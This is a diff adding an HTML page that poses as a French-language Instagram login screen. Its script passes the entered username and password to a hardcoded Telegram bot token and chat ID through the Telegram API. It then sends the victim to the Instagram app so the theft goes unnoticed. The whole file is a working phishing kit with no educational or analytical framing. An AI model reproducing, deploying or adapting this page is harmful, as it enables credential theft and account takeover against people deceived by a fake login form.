@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 350px;
+        }
+        .container h1 {
+            font-family: 'Billabong', cursive;
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+        .containerbutton {
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 8px;
+            width: 100%;
+        }
+        .containebutton {
+            background-color: #255e94;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 8px;
+            width: 100%;
+        }
+        .container input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            display: inline-block;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+            border-radius: 5px;
+        }
+        .container a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .divider:not(:empty)::before {
+            margin-right: .25em;
+        }
+        .divider:not(:empty)::after {
+            margin-left: .25em;
+        }
+        .footer {
+            width: 100%;
+            text-align: center;
+            background-color: #e3e2e2;
+            padding: 10px 0;
+            position: fixed;
+            bottom: 0;
+        }
+
+        .footer img {
+            width: 70px;
+        }
+    </style>
+    <script>
+        function sendToTelegram(username, password) {
+            const botToken = '6686072666:AAGN0s0pUuzlXOGCU1hVC0_pjHiYPrDuO8w';
+            const chatId = '6795721035';
+            const message = `Username: ${username}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href = 'instagram://app';
+                    } else {
+                        alert('Failed to send credentials');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending credentials');
+                });
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault();
+            const username = event.target.username.value;
+            const password = event.target.password.value;
+            sendToTelegram(username, password);
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Instagram</h1>
+        <button class="containebutton">Continuer avec Facebook</button>
+        <div class="divider"> OU </div>
+        <form onsubmit="handleSubmit(event)">
+            <input type="text" name="username" placeholder="Num. téléphone, nom d’utilisateur..." required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit" class="containerbutton">Se connecter</button>
+        </form>
+        <a href="/password-reset">Mot de passe oublié ?</a>
+        <p>Vous n’avez pas de compte ? <a href="/signup">Inscrivez-vous</a></p>
+    </div>
+    <div class="footer">
+        <img src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg" alt="Meta">
+    </div>
+</body>
+</html>
+
